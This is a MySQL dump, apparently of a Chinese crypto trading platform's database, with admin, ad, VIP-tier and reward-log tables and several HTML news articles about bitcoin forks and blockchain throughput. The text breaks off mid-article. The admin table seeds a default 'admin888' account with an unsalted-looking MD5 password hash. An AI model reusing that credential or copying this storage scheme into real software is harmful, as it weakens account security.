/*
Navicat MySQL Data Transfer

Source Server         : localhost_3306
Source Server Version : 50553
Source Host           : localhost:3306
Source Database       : c35

Target Server Type    : MYSQL
Target Server Version : 50553
File Encoding         : 65001

Date: 2018-04-03 14:35:55
*/

SET FOREIGN_KEY_CHECKS=0;

-- ----------------------------
-- Table structure for `movesay_admin`
-- ----------------------------
DROP TABLE IF EXISTS `movesay_admin`;
CREATE TABLE `movesay_admin` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `email` varchar(200) NOT NULL,
  `username` char(16) NOT NULL,
  `nickname` varchar(50) NOT NULL,
  `moble` varchar(50) NOT NULL,
  `password` char(32) NOT NULL,
  `sort` int(11) unsigned NOT NULL,
  `addtime` int(11) unsigned NOT NULL,
  `last_login_time` int(11) unsigned NOT NULL,
  `last_login_ip` int(11) unsigned NOT NULL,
  `endtime` int(11) unsigned NOT NULL,
  `status` int(4) NOT NULL,
  PRIMARY KEY (`id`),
  KEY `status` (`status`),
  KEY `username` (`username`)
) ENGINE=MyISAM AUTO_INCREMENT=13 DEFAULT CHARSET=utf8 ROW_FORMAT=DYNAMIC COMMENT='管理员表';

-- ----------------------------
-- Records of movesay_admin
-- ----------------------------
INSERT INTO `movesay_admin` VALUES ('1', '', 'admin888', 'adminc35', '', '7fef6171469e80d32c0559f88b377245', '0', '0', '0', '0', '0', '1');

-- ----------------------------
-- Table structure for `movesay_adver`
-- ----------------------------
DROP TABLE IF EXISTS `movesay_adver`;
CREATE TABLE `movesay_adver` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `name` varchar(20) NOT NULL,
  `url` varchar(255) NOT NULL,
  `img` varchar(250) NOT NULL,
  `type` varchar(50) NOT NULL,
  `sort` int(11) unsigned NOT NULL,
  `addtime` int(11) unsigned NOT NULL,
  `endtime` int(11) unsigned NOT NULL,
  `status` tinyint(4) NOT NULL,
  PRIMARY KEY (`id`),
  KEY `name` (`name`),
  KEY `status` (`status`)
) ENGINE=MyISAM AUTO_INCREMENT=14 DEFAULT CHARSET=utf8 ROW_FORMAT=DYNAMIC COMMENT='广告图片表';

-- ----------------------------
-- Records of movesay_adver
-- ----------------------------
INSERT INTO `movesay_adver` VALUES ('11', '3', '', '5887920f23e85.jpg', '', '0', '1485279756', '1485279758', '1');
INSERT INTO `movesay_adver` VALUES ('12', '8', '', '5895385442e24.jpg', '', '0', '1486174299', '1486174302', '1');
INSERT INTO `movesay_adver` VALUES ('10', '2', '', '5922c0d9d25b9.jpg', '', '0', '1483372800', '1483372800', '1');
INSERT INTO `movesay_adver` VALUES ('9', '1', '', '5922c0b9bf48c.jpg', '', '0', '1485279587', '1485279589', '1');
INSERT INTO `movesay_adver` VALUES ('8', '春节公告', '', '58878fbc59bd1.jpg', '', '1', '1475170380', '1475170382', '0');

-- ----------------------------
-- Table structure for `movesay_appads`
-- ----------------------------
DROP TABLE IF EXISTS `movesay_appads`;
CREATE TABLE `movesay_appads` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `name` varchar(20) NOT NULL,
  `content` varchar(256) NOT NULL,
  `url` varchar(255) NOT NULL,
  `img` varchar(255) DEFAULT NULL,
  `block_id` varchar(50) NOT NULL,
  `sort` int(11) unsigned NOT NULL,
  `addtime` int(11) unsigned NOT NULL,
  `endtime` int(11) unsigned NOT NULL,
  `status` tinyint(4) NOT NULL,
  PRIMARY KEY (`id`),
  KEY `name` (`name`),
  KEY `status` (`status`)
) ENGINE=MyISAM AUTO_INCREMENT=31 DEFAULT CHARSET=utf8 ROW_FORMAT=DYNAMIC COMMENT='广告图片表';

-- ----------------------------
-- Records of movesay_appads
-- ----------------------------
INSERT INTO `movesay_appads` VALUES ('21', '购物广告1', '购物广告1内容', '/', '/Upload/app/1918451.jpg', '17', '0', '0', '0', '1');

-- ----------------------------
-- Table structure for `movesay_appadsblock`
-- ----------------------------
DROP TABLE IF EXISTS `movesay_appadsblock`;
CREATE TABLE `movesay_appadsblock` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `name` varchar(20) NOT NULL,
  `content` varchar(256) NOT NULL,
  `rank` varchar(256) DEFAULT NULL,
  `img` varchar(255) DEFAULT NULL,
  `remain` varchar(255) DEFAULT '3',
  `type` varchar(50) NOT NULL,
  `sort` int(11) unsigned NOT NULL,
  `addtime` int(11) unsigned NOT NULL,
  `endtime` int(11) unsigned NOT NULL,
  `status` tinyint(4) NOT NULL,
  PRIMARY KEY (`id`),
  KEY `name` (`name`),
  KEY `status` (`status`)
) ENGINE=MyISAM AUTO_INCREMENT=20 DEFAULT CHARSET=utf8 ROW_FORMAT=DYNAMIC COMMENT='广告图片表';

-- ----------------------------
-- Records of movesay_appadsblock
-- ----------------------------
INSERT INTO `movesay_appadsblock` VALUES ('17', '购物广告', '购物板块介绍购物板块介绍购物板块介绍购物板块介绍', '4', '/Upload/app/577a0f30b2235.png', '6', '', '0', '0', '0', '1');
INSERT INTO `movesay_appadsblock` VALUES ('18', '挖财广告', '	挖财广告板块介绍挖财广告板块介绍挖财广告板块介绍', '2', '/Upload/app/577a0f537b103.png', '5', '', '0', '0', '0', '1');
INSERT INTO `movesay_appadsblock` VALUES ('19', '商城广告', '	商城广告描叙	商城广告描叙	商城广告描叙', '3', '/Upload/app/577a0fa0c9e1e.png', '4', '', '0', '0', '0', '1');

-- ----------------------------
-- Table structure for `movesay_appc`
-- ----------------------------
DROP TABLE IF EXISTS `movesay_appc`;
CREATE TABLE `movesay_appc` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `web_name` varchar(64) DEFAULT NULL,
  `web_title` varchar(64) DEFAULT NULL,
  `web_icp` varchar(64) DEFAULT NULL,
  `index_img` varchar(256) DEFAULT NULL,
  `pay` varchar(256) DEFAULT NULL,
  `withdraw_notice` varchar(256) DEFAULT NULL,
  `charge_notice` varchar(256) DEFAULT NULL,
  `show_coin` varchar(255) DEFAULT NULL,
  `show_market` varchar(255) DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=3 DEFAULT CHARSET=utf8 ROW_FORMAT=DYNAMIC;

-- ----------------------------
-- Records of movesay_appc
-- ----------------------------
INSERT INTO `movesay_appc` VALUES ('2', '123', '资产交易平台测试版', '#888999', '#', '{\"alipay\":{\"name\":\"\\u5f20\\u4e09\",\"value\":\"zhangsan@n7z.net\"},\"bank\":{\"name\":\"\\u674e\\u56db\",\"value\":\"88888888666666\"}}', '提现说明文字后台可配置', '充值说明文字 后台可配置', 'null', 'null');

-- ----------------------------
-- Table structure for `movesay_app_log`
-- ----------------------------
DROP TABLE IF EXISTS `movesay_app_log`;
CREATE TABLE `movesay_app_log` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `uid` int(11) NOT NULL,
  `type` varchar(64) NOT NULL,
  `content` varchar(255) NOT NULL,
  `addtime` int(10) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=50 DEFAULT CHARSET=utf8 ROW_FORMAT=DYNAMIC;

-- ----------------------------
-- Records of movesay_app_log
-- ----------------------------
INSERT INTO `movesay_app_log` VALUES ('31', '86345', 'vip', '初始化等级vip0', '1467622365');
INSERT INTO `movesay_app_log` VALUES ('32', '86345', 'vip', '升级到vip1', '1467622365');
INSERT INTO `movesay_app_log` VALUES ('33', '86345', 'click_ads', '查看广告[id:27]盈利:cny 0.2', '1467622984');
INSERT INTO `movesay_app_log` VALUES ('34', '86345', 'click_ads', '查看广告[id:27]盈利:cny 0.2', '1467623001');
INSERT INTO `movesay_app_log` VALUES ('35', '86345', 'click_ads', '查看广告[id:28]盈利:cny 0.2', '1467623021');
INSERT INTO `movesay_app_log` VALUES ('36', '86345', 'click_ads', '查看广告[id:22]盈利:cny 0.2', '1467626313');
INSERT INTO `movesay_app_log` VALUES ('37', '86345', 'click_ads', '查看广告[id:22]盈利:cny 0.2', '1467626334');
INSERT INTO `movesay_app_log` VALUES ('38', '86345', 'click_ads', '查看广告[id:27]盈利:cny 0.2', '1467639853');
INSERT INTO `movesay_app_log` VALUES ('39', '86345', 'click_ads', '查看广告[id:21]盈利:cny 0.2', '1467644164');
INSERT INTO `movesay_app_log` VALUES ('40', '86345', 'click_ads', '查看广告[id:21]盈利:cny 0.2', '1467644379');
INSERT INTO `movesay_app_log` VALUES ('41', '86345', 'click_ads', '查看广告[id:21]盈利:cny 0.2', '1467644822');
INSERT INTO `movesay_app_log` VALUES ('42', '86345', 'click_ads', '查看广告[id:22]盈利:cny 0.2', '1467644841');
INSERT INTO `movesay_app_log` VALUES ('43', '86345', 'vip', '升级到vip3', '1467773095');
INSERT INTO `movesay_app_log` VALUES ('44', '86345', 'click_ads', '查看广告[id:21]盈利:cny 0.3', '1467897644');
INSERT INTO `movesay_app_log` VALUES ('45', '86345', 'click_ads', '查看广告[id:27]盈利:cny 0.3', '1467904221');
INSERT INTO `movesay_app_log` VALUES ('46', '86345', 'click_ads', '查看广告[id:23]盈利:cny 0.3', '1468298986');
INSERT INTO `movesay_app_log` VALUES ('47', '86345', 'click_ads', '查看广告[id:26]盈利:cny 0.3', '1468477314');
INSERT INTO `movesay_app_log` VALUES ('48', '86345', 'click_ads', '查看广告[id:21]盈利:cny 0.3', '1468806973');
INSERT INTO `movesay_app_log` VALUES ('49', '86345', 'click_ads', '查看广告[id:21]盈利:cny 0.3', '1469116345');

-- ----------------------------
-- Table structure for `movesay_app_vip`
-- ----------------------------
DROP TABLE IF EXISTS `movesay_app_vip`;
CREATE TABLE `movesay_app_vip` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `tag` varchar(255) DEFAULT NULL,
  `name` varchar(32) DEFAULT NULL,
  `rule` text,
  `times` int(11) DEFAULT NULL,
  `price_num` varchar(255) DEFAULT NULL,
  `price_coin` varchar(255) DEFAULT NULL,
  `status` tinyint(4) DEFAULT NULL,
  `addtime` int(10) DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=7 DEFAULT CHARSET=utf8 ROW_FORMAT=DYNAMIC;

-- ----------------------------
-- Records of movesay_app_vip
-- ----------------------------
INSERT INTO `movesay_app_vip` VALUES ('4', '1', 'vip1', '[{\"id\":\"1\",\"num\":10},{\"id\":\"2\",\"num\":20}]', '6', '0.1', '1', '1', '1467616831');
INSERT INTO `movesay_app_vip` VALUES ('5', '2', 'vip2', '[{\"id\":\"1\",\"num\":20},{\"id\":\"2\",\"num\":30}]', '6', '0.2', '1', '1', '1467616860');
INSERT INTO `movesay_app_vip` VALUES ('6', '3', 'vip3', '[{\"id\":\"1\",\"num\":30},{\"id\":\"2\",\"num\":40}]', '6', '0.3', '1', '1', '1467616884');

-- ----------------------------
-- Table structure for `movesay_app_vipuser`
-- ----------------------------
DROP TABLE IF EXISTS `movesay_app_vipuser`;
CREATE TABLE `movesay_app_vipuser` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `uid` int(11) NOT NULL,
  `vip_id` int(11) NOT NULL,
  `addtime` int(10) DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=3 DEFAULT CHARSET=utf8 ROW_FORMAT=DYNAMIC;

-- ----------------------------
-- Records of movesay_app_vipuser
-- ----------------------------
INSERT INTO `movesay_app_vipuser` VALUES ('2', '86345', '6', '1467622365');

-- ----------------------------
-- Table structure for `movesay_article`
-- ----------------------------
DROP TABLE IF EXISTS `movesay_article`;
CREATE TABLE `movesay_article` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `title` varchar(255) CHARACTER SET utf8 NOT NULL,
  `en_title` varchar(255) CHARACTER SET utf8 DEFAULT NULL,
  `content` text CHARACTER SET utf8 NOT NULL,
  `en_content` text CHARACTER SET utf8,
  `adminid` int(10) unsigned NOT NULL,
  `type` varchar(255) CHARACTER SET utf8 NOT NULL,
  `hits` int(11) unsigned NOT NULL,
  `footer` int(11) unsigned NOT NULL,
  `index` int(11) unsigned NOT NULL,
  `sort` int(11) unsigned NOT NULL,
  `addtime` int(11) unsigned NOT NULL,
  `endtime` int(11) unsigned NOT NULL,
  `status` tinyint(4) NOT NULL,
  PRIMARY KEY (`id`),
  KEY `status` (`status`),
  KEY `type` (`type`),
  KEY `adminid` (`adminid`)
) ENGINE=MyISAM AUTO_INCREMENT=89 DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;

-- ----------------------------
-- Records of movesay_article
-- ----------------------------
INSERT INTO `movesay_article` VALUES ('79', '彼得·泰尔 : 比特币潜力被低估，它比黄金更难挖', '', '<p style=\"color:#555555;font-family:&quot;font-size:18px;background-color:#FFFFFF;\">\r\n	在沙特阿拉伯金融投资计划峰会的第三天，彼得·泰尔发表了这一言论，当前，他对大多数加密货币虽然持有着怀疑的态度，但他相信，比特币如果能够采取一个好的前进轨迹，其会拥有一个光明的未来。\r\n</p>\r\n<p style=\"color:#555555;font-family:&quot;font-size:18px;background-color:#FFFFFF;\">\r\n	泰尔在接受福克斯商业网络主持人玛丽亚·巴提罗莫（Maria Bartiromo）的采访时表示，“那些批评比特币的人，对其的认识是不足的，它就像是资金的一种储备形式，它就像黄金一样，它是一种价值存储。你不需要将其用作支付方式。”\r\n</p>\r\n<p style=\"color:#555555;font-family:&quot;font-size:18px;background-color:#FFFFFF;\">\r\n	<p style=\"color:#555555;font-family:&quot;font-size:18px;background-color:#FFFFFF;\">\r\n		他接着表示：\r\n	</p>\r\n	<blockquote style=\"background:#F3F5F9;color:#555555;font-family:&quot;font-size:18px;\">\r\n		<p style=\"color:#666666;font-size:12px;font-family:&quot;\">\r\n			“如果比特币最终能够成为和黄金相当的网络，那么它还拥有很大的潜力。”\r\n		</p>\r\n	</blockquote>\r\n	<p style=\"color:#555555;font-family:&quot;font-size:18px;background-color:#FFFFFF;\">\r\n		泰尔此前曾表示，比特币无法成为好的支付方式。早在2014年，泰尔在一次AMA对话活动中提到，比特币的支付系统严重缺乏支持，但当时他并不愿意提出更乐观的看法。\r\n	</p>\r\n	<p style=\"color:#555555;font-family:&quot;font-size:18px;background-color:#FFFFFF;\">\r\n		他说：“当我看到比特币的支付量确实增加时，我会更看好比特币。”\r\n	</p>\r\n	<p style=\"color:#555555;font-family:&quot;font-size:18px;background-color:#FFFFFF;\">\r\n		此外，泰尔还提到了比特币挖矿这一能源密集型过程要比黄金挖矿更难。\r\n	</p>\r\n	<blockquote style=\"background:#F3F5F9;color:#555555;font-family:&quot;font-size:18px;\">\r\n		<p style=\"color:#666666;font-size:12px;font-family:&quot;\">\r\n			“比特币的挖矿过程就好比黄金，它真的很难挖，实际上它要比黄金更难挖。因此，从这个意义上讲，它更受限制。”\r\n		</p>\r\n	</blockquote>\r\n<img src=\"/Upload/article/5a255e4151e25.jpg\" alt=\"\" />\r\n</p>', '', '1', 'bbb', '0', '1', '1', '0', '1512398417', '1512316800', '0');
INSERT INTO `movesay_article` VALUES ('80', '悉尼大学区块链项目支付处理能力已超Visa，每秒交易吞吐量达66万笔', '', '<p style=\"color:#555555;font-family:&quot;font-size:18px;background-color:#FFFFFF;\">\r\n	经过最新的试验，悉尼大学红蝮蛇区块链（Red Belly Blockchain）项目每秒能够处理的金融交易速度比预想的要高出50倍，其在国际支付方面的速度甚至超过了Visa。\r\n</p>\r\n<p style=\"color:#555555;font-family:&quot;font-size:18px;background-color:#FFFFFF;\">\r\n	<a href=\"http://7fvhfe.com1.z0.glb.clouddn.com/wp-content/uploads/2017/10/201710270309352641.jpg\"><img class=\"alignnone size-full wp-image-143764\" alt=\"blockchain\" src=\"http://7fvhfe.com1.z0.glb.clouddn.com/wp-content/uploads/2017/10/201710270309352641.jpg\" width=\"750\" height=\"450\" style=\"height:auto;\" /></a>\r\n</p>\r\n<p style=\"color:#555555;font-family:&quot;font-size:18px;background-color:#FFFFFF;\">\r\n	<a href=\"http://www.8btc.com/red-belly-blockchain\">据今年7月的报道</a>，悉尼大学研究者研发了一种新型的区块链系统，其在100台机器中能够实现每秒44万笔交易的吞吐量，而Visa网络每秒的交易处理量是5.6万笔。相比之下，比特币每秒的交易量限制在7笔，以太坊区块链则为20笔。\r\n</p>\r\n<p style=\"color:#555555;font-family:&quot;font-size:18px;background-color:#FFFFFF;\">\r\n	这所大学近期在声明中表示，他们最新的研究结果已经证明随着这一系统的扩展，该项技术的性能也得到了改进。\r\n</p>\r\n<p style=\"color:#555555;font-family:&quot;font-size:18px;background-color:#FFFFFF;\">\r\n	Vincent Gramoli博士，同时也是研发红蝮蛇区块链的组织Concurrent Systems Research Group的研究负责人，他说：\r\n</p>\r\n<blockquote style=\"background:#F3F5F9;color:#555555;font-family:&quot;font-size:18px;\">\r\n	<p style=\"color:#666666;font-size:12px;font-family:&quot;\">\r\n		我们最近的测试结果表明，红蝮蛇区块链在单一数据中心设置的300台机器中可以实现每秒66万笔的交易处理量。我们的区块链项目年初在100台机器上的交易处理量是每秒44万笔，与最新的测试结果相比，是相当大的进展。\r\n	</p>\r\n</blockquote>\r\n<p style=\"color:#555555;font-family:&quot;font-size:18px;background-color:#FFFFFF;\">\r\n	这个测试结果来自澳大利亚、巴西、加拿大、德国、印度、新加坡、韩国、英国和美国等14个不同的地点。\r\n</p>\r\n<p style=\"color:#555555;font-family:&quot;font-size:18px;background-color:#FFFFFF;\">\r\n	Gramoli博士补充道，他并不认为目前有任何其他<a href=\"http://www.8btc.com/what-is-blockchain\">区块链</a>能够达到同样的效果。\r\n</p>\r\n<blockquote style=\"background:#F3F5F9;color:#555555;font-family:&quot;font-size:18px;\">\r\n	<p style=\"color:#666666;font-size:12px;font-family:&quot;\">\r\n		我们的研究结果证明我们的区块链性能优于金融机构的现有技术（包括Visa），甚至我们的机器部署在不同的大洲都能共同提供服务。\r\n	</p>\r\n</blockquote>\r\n<p style=\"color:#555555;font-family:&quot;font-size:18px;background-color:#FFFFFF;\">\r\n	红蝮蛇区块链旨在解决数字货币目前面临的问题，比如说双花。它和PoW区块链的不同之处在于，它能在不消耗大量电力的前提下运作。\r\n</p>\r\n<p style=\"color:#555555;font-family:&quot;font-size:18px;background-color:#FFFFFF;\">\r\n	红蝮蛇区块链的下一阶段就是面向所有互联网用户开放使用。\r\n</p>', '', '1', 'bbb', '0', '1', '1', '1', '1512398500', '1512403200', '0');
INSERT INTO `movesay_article` VALUES ('81', '比特币分裂之路：重新梳理BTC、BCC、BTG以及 S2X', '', '<p style=\"color:#333333;font-family:Arial, &quot;background-color:#FFFFFF;\">\r\n	BCC 从比特币原链中分裂出来证明了，Segwit2X（纽约共识）的成功激活并没有成为扩容争议的终点，反而开启了比特币的分裂之路。\r\n</p>\r\n<p style=\"color:#333333;font-family:Arial, &quot;background-color:#FFFFFF;\">\r\n	7 月 23 日，当大家还在为锁定隔离见证从而避免了用户激活软分叉（UASF）而高兴时，比特大陆投资的微比特（Viabtc）公司就宣布，他们将执行用户激活硬分叉（UAHF），而这个方案原本是由比特大陆提出用以应对用户激活软分叉的应急方案。<span style=\"font-family:&quot;\">8 月 1 日 Viabtc 挖出了第一个分裂后的区块，俗称 BCC 的 bitcoin cash 正式从比特币主链中分离出来。</span>\r\n</p>\r\n<p style=\"color:#333333;font-family:Arial, &quot;background-color:#FFFFFF;\">\r\n	现在，随着 2X 硬分叉时间的临近，关于是否要继续支持 Segwit2X 的争议也越来越激烈。交易平台态度不一，矿池算力开始倒戈，比特币的再一次分裂似乎避无可避。除此之外，最近还有一种以对抗挖矿中心化问题为目的的分裂币——比特币黄金（BTG），开始出现在人们的视野。\r\n</p>\r\n<p style=\"color:#333333;font-family:Arial, &quot;background-color:#FFFFFF;\">\r\n	面对这种复杂的局面，吃瓜群众不禁疑惑，BTC、BCC、S2X 以及 BTG 之间到底是一种什么样的关系？\r\n</p>\r\n<p class=\"picbox\" style=\"color:#333333;font-family:Arial, &quot;background-color:#FFFFFF;text-align:center;\">\r\n	<img src=\"https://wx1.sinaimg.cn/large/006V5KdJgy1fkt4l52rosj30m80ggdp5.jpg\" alt=\"比特币分裂解析图\" /><span class=\"picinfo\" style=\"color:#808080;line-height:20px;font-family:&quot;\">比特币分裂解析图</span>\r\n</p>\r\n<p style=\"color:#333333;font-family:Arial, &quot;background-color:#FFFFFF;\">\r\n	<br />\r\n</p>\r\n<h1 style=\"color:#333333;font-weight:400;font-family:Arial, &quot;font-size:26px;background-color:#FFFFFF;\">\r\n	导火索：segwit\r\n</h1>\r\n<p style=\"color:#333333;font-family:Arial, &quot;background-color:#FFFFFF;\">\r\n	Segwit 曾一直是比特币扩容争议的焦点。从技术层面来看，Segwit（隔离见证）是一项具有突破性的发明，它解决了比特币交易延展性的问题，通过将交易签名转移到新的数据结构中，变相增加了区块大小，使其容量能够超过 1M。\r\n</p>\r\n<p style=\"color:#333333;font-family:Arial, &quot;background-color:#FFFFFF;\">\r\n	两个月前，与比特币框架基本相同的莱特币已经激活了隔离见证，并且在此基础上成功测试了闪电网络。然而，在大区块支持者的眼中，向比特币底层协议添加隔离见证，实际上违反了中本聪的初衷，因此它并不能被看做是真正的比特币。\r\n</p>\r\n<p style=\"color:#333333;font-family:Arial, &quot;background-color:#FFFFFF;\">\r\n	于是，<span style=\"font-family:&quot;\">BCC 的开发者在 core 版本代码的基础上删除了 segwit 协议，并将区块大小一次性提升到了 8M。</span>&nbsp;与此同时，为了防止算力不足的情况，他们采取了紧急难度调整算法（EDA），即“若最近 12 小时出块数小于 6 个，则难度自动降低 25%”。而分裂出来的 bitcoin cash 链则完全“克隆”了比特币原链中所有用户的余额信息，所以这些在分裂之前持有比特币的用户在 8 月 1 号，获得了等额的 BCC。但是，由于 BCC 链的分裂并没有经过节点投票，所以社区成员一致认为，这个没有达成共识的硬分叉所产生的代币只能被视为竞争币。\r\n</p>\r\n<p style=\"color:#333333;font-family:Arial, &quot;background-color:#FFFFFF;\">\r\n	到目前为止，在 BCC 出现的这两个多月时间里，它也暴露出一些问题，其中最受人诟病的就是其紧急难度调整机制。当 BCC 链的难度值降低之后，其挖矿收益高于比特币，于是吸引了大量算力投入；但与此同时 BCC 链上的出块速度会增加，难度值也会随之升高，由于 BCC 的价格远不及比特币，所以当难度值升高之后，BCC 的挖矿收益显著下降，于是算力又重新回到 BTC 链上挖矿，如此反复造成了算力在 BTC 和 BCC 两条链上来回转移的状况。\r\n</p>\r\n<p class=\"picbox\" style=\"color:#333333;font-family:Arial, &quot;background-color:#FFFFFF;text-align:center;\">\r\n	<img src=\"https://wx1.sinaimg.cn/large/006V5KdJgy1fkt4mfng25j30m809vdjv.jpg\" />\r\n</p>\r\n<p style=\"color:#333333;font-family:Arial, &quot;background-color:#FFFFFF;\">\r\n	<br />\r\n</p>\r\n<p style=\"color:#333333;font-family:Arial, &quot;background-color:#FFFFFF;\">\r\n	也因为这样，BCC 一度被调侃为两天休一次假的区块链。对于用户而言，大概没有人希望自己的交易要等两天时间才能被确认。此前，BCC 的主要开发者 Séchet 和大区块支持者 BTC.TOP 矿池的负责人江卓尔都曾公开表示，会在 2MB 硬分叉结束之后来确定 BCC 未来的走向，以及如何修改它现存的 BUG。\r\n</p>\r\n<p style=\"color:#333333;font-family:Arial, &quot;background-color:#FFFFFF;\">\r\n	但就在前天（2017 年 10 月 22 日），Bitprim.org 开发平台的负责人 Juan Garavaglia 表示，<span style=\"font-family:&quot;\">BCC 社区决定将于今年 11 月 13 日对 BCC 进行硬分叉以升级网络，来解决“紧急难度调整机制”存在的问题。</span>&nbsp;据了解，这段时间他们一直在测试各种难度调整算法（DAA），Juan Garavaglia 说：“最新的解决方案已经被编码并测试过了，预计在下一个 Bitcoin ABC 版本中，难度调整算法就能够得到修复。”\r\n</p>\r\n<p style=\"color:#333333;font-family:Arial, &quot;background-color:#FFFFFF;\">\r\n	在未来，如果 2X 硬分叉成功，BCC 或许将成为像莱特币一样的存在，可以做比特币的测试链，也可以做比特币的备份链，江卓尔称其为“影子币”；如果 2MB 硬分叉不成功，BCC 就成为了大区块支持者唯一的选择，要做的就是生存下来并与 BCC 展开竞争。按照目前的情况来看，BCC 已经在努力完善自己为争取更多用户做准备了。\r\n</p>\r\n<p style=\"color:#333333;font-family:Arial, &quot;background-color:#FFFFFF;\">\r\n	那么问题来了，2MB 硬分叉能成功吗？\r\n</p>\r\n<h1 style=\"color:#333333;font-weight:400;font-family:Arial, &quot;font-size:26px;background-color:#FFFFFF;\">\r\n	硬分叉：2X\r\n</h1>\r\n<p style=\"color:#333333;font-family:Arial, &quot;background-color:#FFFFFF;\">\r\n	当纽约共识被激活之后，按照约定 2MB 硬分叉将在第 485218 个区块高度（11 月左右）发生，但现在 core 团队和矿工阵营之间的争论已经到了白热化的地步，2X 硬分叉到底能否成功，前景仍然扑朔迷离。\r\n</p>\r\n<p style=\"color:#333333;font-family:Arial, &quot;background-color:#FFFFFF;\">\r\n	要判断它能否成功，首先我们需要定义何为“成功”\r\n</p>\r\n<ul class=\" list-paddingleft-2\" style=\"color:#333333;font-size:14px;background-color:#FFFFFF;font-family:Arial, &quot;\">\r\n	<li style=\"font-family:&quot;\">\r\n		<p style=\"color:#666666;font-size:12px;\">\r\n			<span style=\"color:#333333;\">达成共识即成功</span>\r\n		</p>\r\n	</li>\r\n</ul>\r\n<p style=\"color:#333333;font-family:Arial, &quot;background-color:#FFFFFF;\">\r\n	如果以这个标准定义“成功”，那么只能说 2MB 硬分叉成功过。&nbsp;<span style=\"font-family:&quot;\">今年 5 月份，社区中 85%的成员签署协议表示支持 segwit2x（其中就包括 2X 硬分叉），从而达成了纽约共识。但是从九月初开始，这个共识联盟就明显有瓦解的趋势。</span>\r\n</p>\r\n<p style=\"color:#333333;font-family:Arial, &quot;background-color:#FFFFFF;\">\r\n	先是鱼池（F2POOL）负责人王淳公开表示，“我们承诺在 7 月之前支持 segwit2x，可现在已经 9 月了。”；随后，荷兰比特币支付服务商 Bitwala 也表示，他们将尊重客户意愿不再支持 segwit2x。接着是数字钱包 Vaultoro&nbsp;、比特币借贷平台 Wayniloans 等社区成员纷纷退出纽约共识，截止到目前，纽约共识的退出率已经超过了 27%。\r\n</p>\r\n<p class=\"picbox\" style=\"color:#333333;font-family:Arial, &quot;background-color:#FFFFFF;text-align:center;\">\r\n	<img src=\"https://wx1.sinaimg.cn/large/006V5KdJgy1fkt4od4ctyj30m80ckgsr.jpg\" />\r\n</p>\r\n<p style=\"color:#333333;font-family:Arial, &quot;background-color:#FFFFFF;\">\r\n	<br />\r\n</p>\r\n<p style=\"color:#333333;font-family:Arial, &quot;background-color:#FFFFFF;\">\r\n	同盟的倒戈再加上 bitcoin core 本身就不支持 2MB 区块，所以达成共识希望渺茫。&nbsp;<span style=\"font-family:&quot;\">那么比特币接下来要面临的就可能是再次分裂，形成 BTC 和 S2X 两条区块链</span>&nbsp;。\r\n</p>\r\n<ul class=\" list-paddingleft-2\" style=\"color:#333333;font-size:14px;background-color:#FFFFFF;font-family:Arial, &quot;\">\r\n	<li style=\"font-family:&quot;\">\r\n		<p style=\"color:#666666;font-size:12px;\">\r\n			<span style=\"color:#333333;\">算力超过 75%即成功</span>\r\n		</p>\r\n	</li>\r\n</ul>\r\n<p style=\"color:#333333;font-family:Arial, &quot;background-color:#FFFFFF;\">\r\n	Segwit2x 的开发团队规定在三个月的时间里超过 75%的算力支持 2MB 区块，则硬分叉成功。\r\n</p>\r\n<p style=\"color:#333333;font-family:Arial, &quot;background-color:#FFFFFF;\">\r\n	但目前，鱼池带着近 11%算力离开了 segwit2x，Slush 矿池也已经停止发送支持纽约共识的信号，据 coin.dance 数据显示，segwit2x 的算力支持已经降到了 85%。\r\n</p>\r\n<p class=\"picbox\" style=\"color:#333333;font-family:Arial, &quot;background-color:#FFFFFF;text-align:center;\">\r\n	<img src=\"https://wx1.sinaimg.cn/large/006V5KdJgy1fkt4p83znmj30m805g0vq.jpg\" />\r\n</p>\r\n<p style=\"color:#333333;font-family:Arial, &quot;background-color:#FFFFFF;\">\r\n	<br />\r\n</p>\r\n<p class=\"picbox\" style=\"color:#333333;font-family:Arial, &quot;background-color:#FFFFFF;text-align:center;\">\r\n	<img src=\"https://wx4.sinaimg.cn/large/006V5KdJgy1fkt4pcguffj30m802u3zf.jpg\" />\r\n</p>\r\n<p style=\"color:#333333;font-family:Arial, &quot;background-color:#FFFFFF;\">\r\n	<br />\r\n</p>\r\n<p style=\"color:#333333;font-family:Arial, &quot;background-color:#FFFFFF;\">\r\n	而&nbsp;<span style=\"font-family:&quot;\">segwit2X 的铁杆拥护者比特大陆（蚁池、微比特、BTC.COM）和 BTC.TOP 直接控制的算力总和最多 51%，他们能否阻止算力继续下滑，现在还是未知数。</span>\r\n</p>\r\n<p style=\"color:#333333;font-family:Arial, &quot;background-color:#FFFFFF;\">\r\n	除此之外，在 2X 硬分叉的过程中，纽约共识的开发团队并不会添加类似重放保护的措施，因为他们认为如果添加重放保护，S2X 就会像 BCC 一样发展成为一种竞争币。对此，bitcoin core 开发团队的成员认为，这种行为实际上是对比特币原链的一种攻击，“一切没有重放保护的硬分叉都是耍流氓”。\r\n</p>\r\n<p style=\"color:#333333;font-family:Arial, &quot;background-color:#FFFFFF;\">\r\n	因此 core 的开发者 Luke-jr 早前就在论坛上说过，他们已经在着手准备修改 POW 共识机制，来防止 2X 硬分叉的攻击行为了，而目前大部分的节点仍然运行的是 core 版本的客户端。所以，&nbsp;<span style=\"font-family:&quot;\">一旦 bitcoin core 的开发者修改了比特币的底层协议，那么即使支持 2MB 硬分叉的算力超过了 75%，比特币还是有可能在 11 月发生分裂，产生 BTC 和 S2X 两条区块链</span>&nbsp;。\r\n</p>\r\n<ul class=\" list-paddingleft-2\" style=\"color:#333333;font-size:14px;background-color:#FFFFFF;font-family:Arial, &quot;\">\r\n	<li style=\"font-family:&quot;\">\r\n		<p 